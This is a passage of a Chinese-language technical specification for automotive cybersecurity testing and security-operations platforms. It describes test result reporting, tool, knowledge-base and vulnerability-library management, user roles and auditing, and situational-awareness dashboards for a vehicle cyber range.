）和手动添加的测试用例。</p><p>测试用例的应用性：</p><p>用户可以为指定的待测试设备或测试方向应用特定的测试用例，以提高测试的便利性和实际操作的相关性。</p><p>测试用例的状态与审核：</p><p>定制的测试用例应具有编写、试用、发布等状态。</p><p>平台支持审核功能，可以提交到实验室负责人进行审核，审核通过后，测试用例即可更新到关联的模块中。</p><p>测试用例与需求文档关联：</p><p>测试用例编写时支持关联需求文档，如需求类别、编号等。</p><p>执行测试用例的任务可以查看到关联的需求文档和需求编号等信息。</p><p>测试用例模板上传与下载：</p><p>平台支持上传测试用例模板，以便用户能够按照一定的格式编写和下载测试用例。</p><p>这有助于标准化测试用例的格式，确保测试的一致性和高效性。</p><h5 id="结果管理功能布局"><a href="#结果管理功能布局" class="headerlink" title="结果管理功能布局"></a>结果管理功能布局</h5><h6 id="功能实施方案-31"><a href="#功能实施方案-31" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>平台提供了详细的测试结果统计功能，这包括了通过项、失败项及跳过项数。这种统计结果对于评估整体的测试效果至关重要，帮助测试团队快速识别测试过程中的成功点和潜在的问题点。通过这些数据，团队可以进行深入分析，找出失败的原因，确保未来的测试能够更加精准地定位问题。</li><li>平台支持对特定车型的测试结果进行全面统计，涵盖测试控制器、测试轮数、测试问题数等多个维度。这使得测试团队可以清晰地了解每个控制器的测试情况，识别出问题频发的控制器，以及发现重复出现问题的模式。这样的统计功能有助于测试团队优化测试计划，提高测试的针对性和效率。</li><li>为了便于测试数据的离线分析和共享，平台支持将车型测试结果导出为EXCEL等格式的文件。这种导出功能让测试数据更加便携，让团队成员即使在没有连接到测试管理软件，处于离线的情况下，也能进行测试结果的查看和分析。</li><li>测试过程中产生的各种数据，包括CAN测试数据、以太网测试数据、终端系统测试数据等，都可以在平台上实现统一管理。这种集中管理的方式大大简化了测试数据的存取和维护工作，提高了数据管理的效率和安全性。</li><li>平台支持将测试数据与对应的测试用例名称进行匹配，确保每一份测试数据都能迅速找到对应的测试用例。这种一一对应的关系极大地方便了测试问题项数据的快速定位，加快了问题的诊断和解决过程。</li><li>测试数据的存储位置灵活多变，既可以存储于服务器端，也可以存储于客户端。若选择服务器端存储，用户可以通过测试管理软件方便地下载数据到本地，提供了数据存取的灵活性和便捷性。</li><li>平台支持用户上传自己的测试报告模板，使得测试报告的生成更加个性化和符合企业标准。这种自定义模板的功能让测试报告更加专业，更能满足不同用户的需求。</li><li>测试报告支持多种格式，包括通用的Excel和Word文档格式。这种多样的报告格式选择，确保了用户可以根据自己的需求和习惯选择最合适的报告形式。</li><li>为了提高效率，平台支持自动化生成测试报告。用户可以在测试管理软件中轻松下载和查看这些报告，无需手动编制，节省了大量的时间和劳力。</li><li>在测试报告中，所有的图片都是清晰、易懂的，并且为问题分析提供了便利。这样的设计使得报告的接收者可以直观地理解测试结果，更快地进行问题分析和决策。</li><li>测试报告中详细记录了每个测试内容对应的测试数据，包括问题发生的时间或者数据截图。这种详尽的信息记录，极大地方便了问题的追踪和分析，提高了问题解决的效率。</li><li>平台允许用户导出测试过程中的中间数据，包括测试操作日志，收发报文等。这些数据的导出为测试过程的透明度和可追溯性提供了保证，便于后期的详细分析和问题复现。</li><li>测试任务的结果细分为总体结果和每次迭代的结果，这样的结果划分让测试团队可以更好地了解每个迭代的具体表现，以及整体任务的最终成果。这种分层次的结果展示，有助于团队成员对测试进度和效果进行细致的评估和控制。</li></ol><h6 id="技术实现内容-26"><a href="#技术实现内容-26" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>测试结果统计：</p><p>平台应提供功能以统计每次测试的结果，包括通过项、失败项及跳过项的数量。</p><p>这将帮助用户快速了解测试的概况和关注点。</p><p>车型测试结果综合统计：</p><p>应支持对单个车型的综合测试结果进行统计，包括测试的控制器数量、测试轮次、发现的问题数量等。</p><p>统计数据应能揭示哪些控制器被频繁测试、哪些问题经常出现，以及哪些问题是重复的。</p><p>测试结果导出：</p><p>用户应能将测试结果导出为EXCEL等格式的文件，以便于进行离线分析和记录。</p><p>测试数据统一管理：</p><p>平台应支持CAN测试数据、以太网测试数据、终端系统测试数据等的统一管理。</p><p>这有助于保持数据的有序性和可访问性。</p><p>测试数据与测试用例对应：</p><p>测试数据应与相应的测试用例名称一一对应，以便用户能快速定位测试中的问题项。</p><p>测试数据存储位置：</p><p>测试数据既可以存储在服务器端，也可以存储在客户端。</p><p>若存储在服务器端，用户应能通过测试管理软件下载数据到本地。</p><p>上传测试报告模板：</p><p>平台应支持上传自定义的测试报告模板，以便生成符合用户需求的测试报告。</p><p>测试报告格式：</p><p>测试报告应支持Excel或Word格式，以适应不同用户的需求。</p><p>自动化生成测试报告：</p><p>测试报告应支持自动化生成，并能在测试管理软件中下载和查看。</p><p>测试报告的质量：</p><p>报告中的图片应清晰、易懂，并且便于问题分析。</p><p>测试报告内容详细：</p><p>测试报告应包含各个测试内容对应的测试数据，并能将问题发生的时间或数据截图整合到报告中，方便后续的问题跟踪和分析。</p><p>中间测试数据导出：</p><p>用户应能通过平台导出包括测试操作日志、收发报文等中间测试数据。</p><p>测试任务结果分类：</p><p>测试任务结果应分为总体结果和每次迭代的结果，以便用户了解每个阶段的测试情况。</p><h5 id="工具管理功能布局"><a href="#工具管理功能布局" class="headerlink" title="工具管理功能布局"></a>工具管理功能布局</h5><h6 id="功能实施方案-32"><a href="#功能实施方案-32" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>平台具备全面的工具管理功能，能够展示系统内所有的工具，无论是已经接入的还是未接入的工具。对于每个工具，平台都提供了详尽的信息，包括工具的版本、描述和其他相关的元数据。这样的管理和展示功能不仅让用户能够一目了然地了解工具库的当前状态，也便于进行版本控制和功能审查，确保了工具集合的完整性和最新性。</li><li>平台上的工具状态分为在线和离线两种。已接入且启动的工具会显示为在线状态，这意味着工具已经准备好并可以立即使用。相反，未启动的工具则会显示为离线状态，提示用户该工具当前不可用。这种状态指示功能使得用户可以迅速了解每个工具的可用性，并据此进行相应的操作。</li><li>为了方便用户扩展和自定义工具集，平台支持工具的添加和连接配置。用户可以通过简单的界面操作来添加新工具，配置工具的连接参数，使其能够顺利地接入系统。这种灵活的配置方式大大降低了工具接入的门槛，提高了工具集成的效率。</li><li>当工具处于离线状态时，平台会在任务中显示其状态，并提示相应的任务无法执行。这种设计避免了用户在不知情的情况下尝试启动无法执行的任务，从而节省了时间，并提高了工作效率。</li><li>平台还支持查看和配置工具的接入权限，以及查看工具的使用记录和占用状态。这种权限管理和使用情况展示功能，让管理员可以有效地控制工具的访问和使用，确保资源的合理分配和监控。</li><li>用户还可以在平台上查看每个工具的说明书、调用API等相关信息。这些信息的提供，使得用户可以更加深入地了解工具的功能和使用方法，提高了工具的使用效率和效果。</li><li>平台具备对不同的使用状态的监控统计功能，并对相关信息进行记录统计等功能。通过这些功能，用户不仅可以监控工具的实时使用情况，还可以回顾工具的历史使用记录，进行数据分析和资源优化。这种统计功能是资源管理和决策支持的重要工具，有助于提高整个系统的运行效率。</li></ol><h6 id="技术实现内容-27"><a href="#技术实现内容-27" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>工具管理与展示：</p><p>系统应提供一个界面，用于展示所有工具的列表，包括已接入的工具和未接入的工具。</p><p>每个工具旁边应显示其版本信息和描述，以便用户能够快速了解工具的功能和适用场景。</p><p>工具状态管理：</p><p>工具的状态应明确标识为“在线”或“离线”。</p><p>“在线”状态表示工具已经接入并启动，可以正常使用。</p><p>“离线”状态表示工具未启动，不可用于当前测试任务。</p><p>工具添加与配置：</p><p>用户应能轻松添加新工具，并通过平台进行连接配置。</p><p>这可能包括指定IP地址、端口号、认证信息等，以确保工具能够成功接入系统。</p><p>任务中的工具状态提示：</p><p>如果某个任务需要使用的工具处于离线状态，任务状态应显示这一信息，并提示用户该任务当前不可执行。</p><p>工具权限和使用记录管理：</p><p>平台应支持查看和配置工具的接入权限，以确保只有授权用户可以使用特定工具。</p><p>工具的使用记录应被记录和展示，包括谁使用了工具、使用时间和持续时间等。</p><p>工具的占用状态也应实时展示，以避免资源冲突。</p><p>工具文档和API信息：</p><p>用户应能够查看每个工具的说明书和调用API的相关信息。</p><p>这将帮助用户了解如何正确使用工具，并能够在必要时进行故障排除。</p><p>使用状态和记录统计：</p><p>系统应提供工具的使用状态和记录的统计功能。</p><p>这将包括工具的使用频率、使用时长、使用效率等统计数据，以便于管理和优化工具的使用。</p><h5 id="知识库管理功能布局"><a href="#知识库管理功能布局" class="headerlink" title="知识库管理功能布局"></a>知识库管理功能布局</h5><h6 id="功能实施方案-33"><a href="#功能实施方案-33" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>知识库管理是网络安全检测平台的重要组成部分，它允许用户对入侵检测与防御测试系统相关的资料文件进行集中统一管理。这些资料文件的范围涵盖了系统的整体介绍、各类软件的使用说明书等各种文档资料。平台为这些文档资料提供了一系列的操作功能，包括上传新的资料文件，以便共享最新的信息；下载已有的文件，以便用户可以随时获取所需的知识；删除过时或不再需要的文件，以确保知识库的内容保持最新和相关性。这样的管理功能确保了知识库的内容既丰富又易于维护，从而帮助用户快速获取所需信息，提升了整个系统的使用效率和用户的工作效率。</li><li>平台的知识库管理还特别支持针对漏洞利用方法的知识累积。用户可以编辑文本，记录和分享关于漏洞利用的最新发现和经验。此外，为了使知识更加直观易懂，平台支持在文本中直接添加图片，这样可以将复杂的漏洞信息和利用技巧通过图文并茂的方式展示出来，使得知识的传播更加高效。这种灵活的内容编辑功能，不仅便于知识的整理和归纳，也方便其他用户的学习和理解，从而共同提升团队对安全威胁的应对能力。</li><li>为了进一步提升知识库的组织性和用户的使用体验，平台支持用户自定义文件目录结构。这意味着用户可以根据自己的需要创建文件夹，按照、主题或其他任何逻辑来组织文件，这样的自定义结构使得知识库的内容更加有序，便于用户快速定位和检索所需的资料。这种个性化的文件管理方式，不仅提高了知识库的可用性，也方便了团队成员之间的协作和知识共享。</li></ol><h6 id="技术实现内容-28"><a href="#技术实现内容-28" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>知识库管理：</p><p>系统应提供一个知识库管理模块，用于存储和管理入侵检测与防御测试系统的相关资料文件。</p><p>资料文件的范围应包括但不限于系统整体介绍、各软件使用说明书等文档。</p><p>用户应能够执行上传、下载和删除文件的操作。</p><p>知识库应有权限管理功能，确保只有授权用户才能上传和删除文件，而所有用户都可以下载文件。</p><p>漏洞利用方法知识累积：</p><p>系统应允许用户针对特定的漏洞利用方法编写和累积知识。</p><p>编辑器应支持文本编辑，并允许用户在文本中插入图片、表格等多媒体元素。</p><p>这些记录应方便用户查阅，以提供关于如何识别和防御特定漏洞的指南。</p><p>自定义文件目录结构：</p><p>用户应能够自定义知识库的文件目录结构，以适应不同的组织需求。</p><p>这包括创建文件夹、子文件夹，以及对文件和文件夹进行命名，以保持知识库的有序性。</p><p>文件目录结构应支持拖放操作，以便用户能够轻松地管理和重新组织文件。</p><h5 id="漏洞管理功能布局"><a href="#漏洞管理功能布局" class="headerlink" title="漏洞管理功能布局"></a>漏洞管理功能布局</h5><h6 id="功能实施方案-34"><a href="#功能实施方案-34" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>漏洞库是网络安全检测平台的核心功能之一，它提供了详尽的测试漏洞信息，以便用户能够快速识别和响应潜在的安全威胁。每条漏洞记录至少包含漏洞的CVE编号、CNNVD编号，这些是国际和国内通用的漏洞识别标准，便于与全球安全数据库同步和比对。除此之外，漏洞库还详细列出了漏洞名称、影响版本、影响模块，这些信息对于理解漏洞的范围和潜在影响至关重要。漏洞等级则提供了一个快速的风险评估，帮助用户优先处理最严重的安全问题。这样的细致记录不仅提高了漏洞响应的效率，也加强了整个安全管理的系统性和可靠性。</li><li>为了优化漏洞处理的优先级，平台的漏洞库支持按照漏洞等级进行升降排序。这个功能使得用户可以根据风险程度快速地对漏洞列表进行排序，从而先关注那些最严重的漏洞。这种排序机制简化了安全管理流程，使得安全团队能够更加高效和有序地对漏洞进行评估、处理和修复。</li><li>为了提升用户检索漏洞信息的便捷性，平台支持对漏洞的编号/名称进行模糊查询，以及按照漏洞等级进行查询。这样的查询功能可以让用户即使在记不清确切的编号或名称时，也能够快速找到相关的漏洞信息。此外，为了保证漏洞库的时效性和准确性，平台需定期从漏洞扫描工具获取最新漏洞库信息。这种定期更新机制确保了漏洞库的数据与全球最新的安全威胁同步，帮助用户及时发现和应对新出现的安全漏洞。</li><li>平台提供了漏洞平台调用接口，这意味着其他系统和工具可以通过这些接口与漏洞库进行交互，获取所需的漏洞数据。这种接口的提供极大地增强了平台的互操作性，使得安全团队可以将漏洞库与自己的工作流程无缝集成，进一步提高工作效率。</li><li>对于特定领域，如汽车行业，平台还提供了车型漏洞库，显示针对不同车型测试的缺陷信息。这些信息包括发现日期、缺陷描述、关联车型和零部件等，为用户提供了全面的缺陷分析。与漏洞库相似，车型漏洞库同样支持按照缺陷等级进行升降排序，这样的功能使得用户能够依据严重性来安排缺陷的修复工作，提高了安全管理的针对性和效率。</li><li>车型缺陷管理数据来源有两种方式：一是通过平台测试产生的缺陷数据，二是通过导入Excel格式的缺陷信息。这两种方式都支持数据的手动删除，以便用户可以清理不再需要的记录，保持数据库的准确性和相关性。对于平台自身产生的数据，还可以通过回归测试来自动删除已经解决或不再相关的缺陷，这样的自动化处理进一步提高了数据管理的效率。</li><li>平台还支持用户将漏洞利用方法编辑成文本，并将这些文本录入知识库。这种编辑和导入功能使得用户可以将实践中的经验和技巧系统化，转化为知识库中的资料，方便团队成员学习和参考。通过这种方式，知识库不仅收录了静态的漏洞信息，还积累了动态的处理经验和技巧，为安全团队提供了一个全面的学习和参考平台。</li></ol><h6 id="技术实现内容-29"><a href="#技术实现内容-29" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>漏洞库信息展示：</p><p>漏洞库应展示关键信息，包括但不限于：</p><p>CVE编号：漏洞的通用漏洞编号，为国际公认的标准化漏洞管理数据格式。</p><p>CNNVD编号：中国国家信息安全漏洞库编号。</p><p>漏洞名称：对漏洞的简短描述或命名。</p><p>影响版本：受漏洞影响的软件或硬件版本。</p><p>影响模块：受影响的系统或软件模块。</p><p>漏洞等级：漏洞的严重性等级，可以是高、中、低等级别。</p><p>漏洞等级排序：</p><p>漏洞库应支持按照漏洞等级进行升序或降序排序，以便用户可以根据严重性快速定位漏洞。</p><p>漏洞查询功能：</p><p>用户应能够进行模糊查询，如通过漏洞编号或名称搜索相关漏洞。</p><p>应支持根据漏洞等级进行查询。</p><p>漏洞库信息需定期更新，系统应能从漏洞扫描工具获取最新的漏洞数据。</p><p>漏洞平台调用接口：</p><p>系统应提供API接口，以便其他系统或工具可以查询漏洞库或利用漏洞信息。</p><p>车型漏洞库展示：</p><p>车型漏洞库应展示与测试相关的缺陷信息，包括：</p><p>发现日期：缺陷被发现的日期。</p><p>缺陷描述：缺陷的详细说明。</p><p>关联车型：受缺陷影响的车型。</p><p>零部件：缺陷相关的零部件信息。</p><p>支持按照缺陷等级进行排序。</p><p>车型缺陷管理：</p><p>数据来源应支持通过平台测试发现的缺陷和导入Excel格式的缺陷信息两种方式。</p><p>用户应能够手动删除缺陷数据。</p><p>通过平台自动生成的数据可在回归测试后自动删除。</p><p>漏洞利用知识库编辑与导入：</p><p>用户应能够编辑漏洞利用方法的文本，并将这些信息导入知识库。</p><p>编辑器应支持文本格式化功能，如添加图片、链接等，以丰富知识库内容。</p><h5 id="系统管理功能布局"><a href="#系统管理功能布局" class="headerlink" title="系统管理功能布局"></a>系统管理功能布局</h5><h6 id="功能实施方案-35"><a href="#功能实施方案-35" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>平台的用户管理模块提供了全面的账户管理功能，包括用户信息的添加、编辑、删除等操作。角色管理功能允许定义不同的用户角色，并为每个角色分配相应的权限。权限管理则确保了用户只能访问他们被授权的资源和数据。审批管理模块使得对于特定操作或决策的审批流程变得清晰而有序。审计管理则记录了用户的所有活动，包括登录、操作和系统变更等，以便进行事后的审查和分析。这些管理功能共同构成了一个安全的、可控的系统管理环境，确保了操作的合规性和安全性。</li><li>平台支持预置五种角色权限，这五种角色分别针对不同的工作职能和责任，包括实验室负责人、测试接口人、测试执行人、三方服务人员和审计人员。每种角色都有其特定的权限和访问级别，以满足其工作需求。此外，平台还支持自定义角色，用户可以根据自己特定的业务需求创建新的角色，并为其分配适当的权限。这种灵活的角色和权限管理机制为用户提供了高度的定制化选项，增强了平台的适用性和用户体验。</li><li>平台提供了基于工作邮箱的注册功能，用户可以通过自己的工作邮箱来注册账户。注册后，平台会进行审核，以确保新用户的合法性和安全性。审核通过后，用户会收到邮件通知，告知其账户已经激活并可以使用。这种注册和审核机制既保证了用户身份的真实性，也加强了系统的安全性。</li><li>实验室负责人在平台上承担着创建和管理测试车型的职责。他们可以添加车型测试专业接口人，并生成该车型对应的审核列表。这个列表会按照类别显示所有待审核的内容，包括测试时间计划、测试内容计划、测试用例发布等。实验室负责人可以进行多种管理操作，如按条件查询、通过审批、查看详情、驳回等。同时，他们还可以查看测试人员的测试状态与进展，以及整体的测试状态与进展，从而全面掌握测试工作的全局情况。</li><li>测试专业接口人负责接收并处理车型测试任务。他们会通过邮件通知收到任务，并负责制定三级测试时间的整体计划。他们还需要设定具体的测试人员、测试项、测试控制器以及具体的测试时间计划。此外，测试专业接口人还需上传测试规范文件和相关需求文件，并开启相关用户的获取权限。通过邮件发送给相关测试人员，对上提交测试任务的审批，如测试的时间计划和测试内容等。与实验室负责人类似，测试专业接口人也能查看测试人员的测试状态与进展，以及整体的测试状态与进展。</li><li>测试人员在接收到具体测试项的任务后，可以根据实际情况修改测试时间计划。他们需要确认测试计划并通知上级审批，一旦审批通过，计划时间则不可再做修改。测试人员还负责执行测试任务，并且可以创建与三方服务人员关联的测试任务。</li><li>三方服务人员的权限被限定在车型测试的相关工作范围内。他们只能进入到车型测试入口，执行测试任务，而不能访问其他与他们职责无关的系统部分，这样的权限划分确保了工作的专注性和安全性。</li><li>为了保护用户的账户安全，平台允许用户修改和重置自己的登录密码。在密码传输过程中，系统会使用加密技术确保密码的密文传输，这样即使在传输过程中数据被截获，密码信息也不会泄露。</li><li>系统升级模块记录了平台所有的历史升级记录，这些记录包括版本号、状态、升级类型、更新时间、升级内容等信息。当进行系统升级时，升级内容会被放置在升级包中，系统在升级过程中会读取并记录本次升级的具体内容，以便用户查看和了解。</li><li>审批功能提供了自定义审批节点模板的功能，用户可以根据自己的业务流程需求，设计和创建审批节点模板，并将这些模板应用在不同模块的审批流程中。这种自定义功能提高了审批流程的灵活性和适应性。</li><li>审批流程中，系统支持向相关用户发送电子邮件通知，确保审批的及时性和相关人员的即时响应。</li><li>平台的审计功能记录了所有的用户操作日志，包括登录、制定计划、创建任务、执行任务、编写漏洞信息、回归测试执行等活动。用户的所有工作过程都会留下日志记录，日志类型可以根据需求进行定制。系统支持多维度的筛选条件，比如时间、执行任务、选择车型、选择测试人等，以便用户能够方便地查看和生成审计记录。这种审计记录不仅增强了操作的透明度，也有助于事后的审查和分析。</li></ol><h6 id="技术实现内容-30"><a href="#技术实现内容-30" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>综合用户与权限管理：</p><p>平台应提供全面的用户管理功能，包括用户账号创建、角色分配、权限设置、审批流程管理，以及审计日志记录。</p><p>用户管理模块应能够处理用户的注册、登录、权限验证、密码管理等功能。</p><p>角色权限预置与自定义：</p><p>平台预置五种角色权限：实验室负责人、测试接口人、测试执行人、三方服务人员、审计人员。</p><p>支持自定义角色和权限设置，以适应不同组织结构和工作流程的需要。</p><p>注册审核与邮件通知：</p><p>用户可以通过工作邮箱进行注册，注册信息需经过审核才能激活账号。</p><p>审核通过后，系统自动发送邮件通知用户。</p><p>实验室负责人的管理职能：</p><p>实验室负责人负责创建测试车型，指定测试专业接口人，并生成审核列表。</p><p>负责人可以按类别管理待审核内容，并执行查询、审批、查看详情、驳回等操作。</p><p>实验室负责人还能查看测试人员和整体测试的状态与进展。</p><p>测试专业接口人的职责：</p><p>测试专业接口人在收到车型测试任务后，负责制定测试时间计划，设定测试人员和测试项等。</p><p>能够上传测试规范和需求文件，并开放给相关用户访问权限。</p><p>可向上级提交测试时间计划审批，并查看测试进展。</p><p>测试执行人的工作流程：</p><p>测试执行人收到具体测试任务后，可以制定或修改测试时间计划，并提交审批。</p><p>审批通过后，测试计划时间固定不变，执行人负责执行测试任务。</p><p>测试执行人可以创建与三方服务人员相关联的测试任务。</p><p>三方服务人员的界面权限：</p><p>三方服务人员的界面权限应被限制仅到车型测试入口，专注于执行测试相关工作。</p><p>用户密码管理：</p><p>用户应能修改和重置自己的登录密码，密码以密文形式传输以确保安全。</p><p>系统升级管理：</p><p>系统应记录每次升级的详细信息，包括版本号、状态、升级类型、更新时间和升级内容。</p><p>升级内容应存放在升级包中，升级过程中系统自动读取并记录本次升级的详细内容。</p><p>自定义审批节点模板：</p><p>支持自定义审批节点模板功能，并可将模板应用于不同的审批流程。</p><p>审批邮件通知：</p><p>审批过程中，系统应支持向相关用户发送电子邮件通知。</p><p>平台审计功能：</p><p>平台应记录用户的所有关键操作日志，包括登录、计划制定、任务创建、任务执行、漏洞信息编写、回归测试等。</p><p>日志记录应支持多维度筛选，例如按时间、任务、车型、测试人等，以便于生成详细的审计记录。</p><h3 id="平台支持"><a href="#平台支持" class="headerlink" title="平台支持"></a>平台支持</h3><h4 id="功能实施方案-36"><a href="#功能实施方案-36" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>本平台采用了B/S架构（浏览器/服务器架构），使得客户端用户无需安装额外的软件，方便客户端通过浏览器访问服务器。在管理平台评审阶段，提供了一个完整的解决方案，其中包括一个具有基本跳转和展示功能的可视化模型。这个模型不仅直观展示了平台的界面布局和工作流程，还模拟了用户操作的基本流程，能够直观地了解平台的功能和操作方式。通过这种方式，确保了评审过程的高效性和系统设计方案的透明度，同时也展示了对用户体验的重视和对技术细节的精细处理。</li></ol><h4 id="技术实现内容-31"><a href="#技术实现内容-31" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>B/S架构开发：</p><p>平台将基于浏览器/服务器（B/S）架构进行开发，确保用户可以通过任何标准的网络浏览器访问系统。</p><p>在管理平台的评审阶段，将提供一个完整的技术方案，并展示一个具备基本跳转及展示功能的可视化原型模型。</p><p>这个原型模型将帮助评审团队理解平台的核心功能和用户界面的布局。</p><h1 id="智能汽车网络靶场安全运营平台"><a href="#智能汽车网络靶场安全运营平台" class="headerlink" title="智能汽车网络靶场安全运营平台"></a>智能汽车网络靶场安全运营平台</h1><h2 id="技术路线-2"><a href="#技术路线-2" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="总体技术要求"><a href="#总体技术要求" class="headerlink" title="总体技术要求"></a>总体技术要求</h3><h4 id="平台技术要求"><a href="#平台技术要求" class="headerlink" title="平台技术要求"></a>平台技术要求</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/db43e52d3335a5afb41e6b113d96299b.png"></p><p>汽车运营中心：作为核心部分，负责整体安全管理和协调工作。它监测车联网平台系统和车联网络的安全状况，并及时通报预警网络安全隐患。在发现威胁攻击时，可以查看攻击状态，并调度安全服务单位、技术支撑厂商、专家组等进行研判会审和应急处置。</p><p>靶场和漏洞管理平台：与汽车运营中心对接，提供靶场环境和漏洞管理功能。靶场平台用于模拟攻击和漏洞测试，漏洞管理平台用于收集和管理发现的漏洞信息。它们将发现的攻击事件和漏洞信息通过接口通报给汽车运营中心。</p><p>安全检测平台：与汽车运营中心对接，用于检测全网车联网的安全事件。它结合威胁分析模型和安全检测规则，对车联网进行实时监测，并将检测到的安全事件通过接口通报给汽车运营中心。</p><p>其他平台：除了靶场、漏洞管理平台和安全检测平台外，还可能存在其他安全相关平台。这些平台的告警和日志信息将被归并整合，并通过接口与汽车运营中心进行交互。</p><h5 id="功能实施方案-37"><a href="#功能实施方案-37" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>平台是一个功能全面的平台，包含系统管理、资产及风险管理、威胁分析和态势展示等多项功能。这些功能的综合运用可以确保平台的稳定运行，管理和保护资产，分析和应对威胁，并提供实时的网络状态展示。通过该平台，参与者可以获得安全可靠的环境，在其中进行演练和测试活动。</li><li>平台支持接入汽车业务平台数据，并进行数据的统一管理和分析。这意味着平台可以集成和处理来自汽车业务平台的数据，对其进行综合管理和分析，以便获取有关安全方面的有用信息。</li><li>平台至少包含五大业务主题库，分别是漏洞库、资产库、事件库、应急库等知识库。这些知识库的存在为平台提供了丰富的数据资源和信息支持，可以帮助参与者更好地管理和应对安全风险。漏洞库用于记录已知的漏洞信息，资产库用于管理和跟踪网络资产，事件库用于记录和分析安全事件，应急库则为应对紧急情况提供相关指导和解决方案。</li><li>平台包含多个业务功能模块，包括通报预警、应急处置、实时监测、资产管理和运营工作台等。通报预警模块负责及时通知相关人员有关安全事件的预警信息。应急处置模块提供针对突发事件的快速响应和处理方案。实时监测模块可以实时监控网络状态和安全事件，以及进行威胁分析。资产管理模块用于管理和跟踪网络资产，包括漏洞管理和资产分类等功能。运营工作台模块为运营人员提供一个集中管理和操作的界面，方便他们有效地管理平台运营工作。</li><li>支持对攻击者数据进行分析，将靶场攻击者的行为和关键信息与现有资产结合分析，以形成资产风险预警。通过对攻击者行为的监测和分析，平台可以发现潜在的威胁，并将其与现有资产进行关联，从而提供准确的资产风险预警。</li><li>支持多维度的安全态势展示，通过数据分析和可视化技术，展现多维度的态势数据，包括整体综合态势、车型态势、漏洞态势、零部件态势等。通过直观的可视化图表和实时数据更新，安全运营和安全运维人员能够全面了解安全状况，发现潜在的安全隐患，并迅速作出反应，确保车辆安全稳定运行。这些态势展示可以帮助安全运营和安全运维人员更好地分析处理安全事件和威胁，从而及时采取针对性的措施加以解决。</li><li>支持对其他平台数据进行汇总、梳理、统计和分析等，以形成统一关联分析的报告。通过与各类安全平台的对接，平台能够自动收集各类数据，并进行统一处理。通过先进的数据处理算法和关联分析技术，平台能够将分散的数据进行整合，形成全面而精准的关联分析报告。这样的报告不仅能够帮助组织全面了解安全事件和漏洞情况，还能为决策提供有力依据，推动安全工作的持续改进。</li></ol><h3 id="安全运营体系建设"><a href="#安全运营体系建设" class="headerlink" title="安全运营体系建设"></a>安全运营体系建设</h3><ol><li>围绕汽车安全运营平台，开展安全运营工作，通过各类专业技术人员的岗位协同工作，对网络安全态势感知所产生的各类汽车安全数据，例如汽车安全事件数据、漏洞数据、威胁情报和安全风险趋势等，通过专业的技术工作，充分和实际环境相结合，输出相关数据监测和分析报告，同时协同外部开展相应的响应和处置工作，更全面、更准确、更高效地行使信息安全监管职能。</li><li><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/58c52925c372b00ef1ee44d021749028.png"></li><li>通过威胁预测、持续检测发现的问题可以辅助提高威胁防护能力，威胁预测及持续检测形成的数据可以支撑响应处置，从而实现安全运行的闭环管理。</li></ol><h4 id="功能架构"><a href="#功能架构" class="headerlink" title="功能架构"></a>功能架构</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/19ccb3de16ccc4440f4fa0bb384113fb.png"></p><h4 id="态势展示"><a href="#态势展示" class="headerlink" title="态势展示"></a>态势展示</h4><h5 id="整体态势"><a href="#整体态势" class="headerlink" title="整体态势"></a>整体态势</h5><p>整体综合态势展示：以图表、报表等形式展示车联网安全态势的整体情况。多种展示模式：提供多种展示模式，包括图标、柱状图、折线图等，以满足不同的展示需求。</p><h6 id="功能实施方案-38"><a href="#功能实施方案-38" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>支持通过综合风险值、资产数量、威胁数量、脆弱性数量和日志接入量五个维度展示整体的安全情况。综合风险值的计算范围可以根据需要进行自定义，包括考虑威胁告警和脆弱性的危害等级、时间范围和处置状态等多个纬度。资产数量展示资产的整体数据情况，威胁数量展示检测到的攻击威胁事件数量，脆弱性数量展示资产的漏洞、弱配置情况，日志接入量展示日志数据的接入采集量，通过这些维度的展示，安全运营和运维人员可以直观地了解靶场的整体安全状况，包括风险程度、资产数量、威胁数量、脆弱性数量以及日志接入量等关键指标。</li><li>支持以地图的形式展现各省的汽车网络安全事件分布态势，并且能够显示攻击源与攻击对象之间的关联。该功能能够根据不同级别的威胁事件对地图进行动态展示，并使用不同颜色进行标识。这样的设计可以帮助用户快速了解各个省份的安全事件分布情况，以及攻击源和攻击对象之间的关系。通过动态展示和颜色标识，用户能够明确辨别出不同级别的威胁事件，从而更好地应对和处理安全风险。</li><li>支持对软硬件资产进行梳理并监控资产的安全状态，来实现安全事件的统计和分析。该功能可以对系统中的所有软硬件资产进行全面梳理，并不断监控它们的安全状态。通过对资产的安全状态进行监控和分析，可以实现安全事件的统计和分析。</li><li>支持对系统中的漏洞信息进行统计和分析，并将结果以直观的形式呈现给管理人员，通过统计分析各个类型漏洞的分布区域、漏洞数量的变化趋势，展示给管理人员，帮助他们更好地了解漏洞的分布情况、变化趋势，了解安全运维工作的闭环情况，从而采取相应的措施进行处理。</li><li>实时监测并显示最新的安全事件告警信息，以便用户及时了解到系统中发生的攻击事件和相关信息。通过显示车辆识别码、攻击来源、攻击事件和攻击等级等详细信息，用户可以更准确地判断事件的重要性和紧急程度，从而采取相应的应对手段。支持可配置的显示属性，例如车型筛选和刷新方式设置。车型筛选功能允许用户根据特定的车型进行过滤和显示，以便更精确地观察特定车型的安全态势情况。</li><li>支持通过统计系统中每天发生的安全事件数量，并将其以折线图的方式呈现给用户。这样的折线图展示方式可以帮助用户更直观地了解安全事件发生的趋势变化，从而及时应对。</li><li>支持按